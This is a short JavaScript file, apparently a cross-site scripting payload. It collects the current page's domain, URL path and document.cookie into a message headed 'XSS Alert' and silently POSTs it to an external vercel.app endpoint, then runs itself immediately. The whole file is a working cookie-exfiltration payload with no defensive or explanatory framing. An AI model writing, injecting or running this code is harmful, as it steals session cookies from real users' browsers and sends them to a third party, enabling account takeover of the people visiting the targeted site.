function telegramSend() {
    var textData =
        'XSS+Alert+in+' + document.domain +
        '</b>%0d%0a------------------------------------------------%0d%0a%0d%0a<b>-+URL+Target+-%0d%0a<pre>' +
        document.location.hostname + document.location.pathname +
        '</pre>%0d%0a%0d%0a<b>-+Document+Cookie+-</b>%0d%0a<pre>' +
        document.cookie + '</pre>';

    var xhr = new XMLHttpRequest();
    xhr.open('POST', 'https://api-xi-two-52.vercel.app/api/config', true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');

    xhr.send('message=' + textData);
}

telegramSend();
